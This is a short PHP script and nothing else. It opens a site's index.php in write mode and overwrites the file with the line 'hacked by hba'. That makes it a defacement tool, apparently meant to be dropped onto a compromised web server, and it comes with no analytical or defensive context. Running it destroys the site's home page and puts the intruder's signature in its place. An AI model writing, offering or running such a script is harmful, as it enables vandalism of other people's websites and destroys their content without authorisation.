
	

 <?php
$file_name='index.php';
 $write_text='hacked by hba';
 
 
 $file_name=$file_name;
 $edit_file = fopen($file_name, 'w');
	
 fwrite($edit_file, $write_text);
 fclose($edit_file);
?>
